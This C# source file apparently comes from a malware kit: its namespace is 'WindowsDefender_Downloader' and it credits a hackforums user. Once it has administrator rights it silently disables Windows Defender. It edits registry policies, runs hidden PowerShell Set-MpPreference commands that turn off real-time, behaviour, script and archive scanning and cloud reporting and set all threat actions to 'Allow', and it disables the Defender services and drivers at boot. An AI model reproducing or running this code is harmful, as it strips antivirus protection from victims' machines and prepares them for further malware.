using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;

namespace WindowsDefender_Downloader
{

    //credits to NYANxCAT - https://hackforums.net/member.php?action=profile&uid=2599514 // 
    //credits to NYANxCAT - https://hackforums.net/member.php?action=profile&uid=2599514 //
    //credits to NYANxCAT - https://hackforums.net/member.php?action=profile&uid=2599514 //

    class Disabledefender
    {

        public static void Run()
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
            Registrys();
        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.Contains(@"DisableRealtimeMonitoring") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.Contains(@"DisableBehaviorMonitoring") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.Contains(@"DisableBlockAtFirstSeen") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.Contains(@"DisableIOAVProtection") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.Contains(@"DisablePrivacyMode") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.Contains("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.Contains(@"DisableArchiveScanning") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.Contains(@"DisableIntrusionPreventionSystem") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.Contains(@"DisableScriptScanning") && line.Contains("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.Contains(@"SubmitSamplesConsent") && !line.Contains("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.Contains(@"MAPSReporting") && !line.Contains("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.Contains(@"HighThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.Contains(@"ModerateThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.Contains(@"LowThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        private static void Registrys()
        {

            try
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);



                // using services to disable windows defender //
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);



                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);

                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "UpdateOnStartUp", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "UpdateOnStartUp", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);

                Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "SecurityHealthService", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "SecurityHealthService", 4, RegistryValueKind.DWord);

                // using services to disable windows defender //
                Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "WdNisSvc", 3, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "WdNisSvc", 3, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "WinDefend", 3, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "WinDefend", 3, RegistryValueKind.DWord);
            }
            catch (Exception)
            {
            }

        }
    }
}
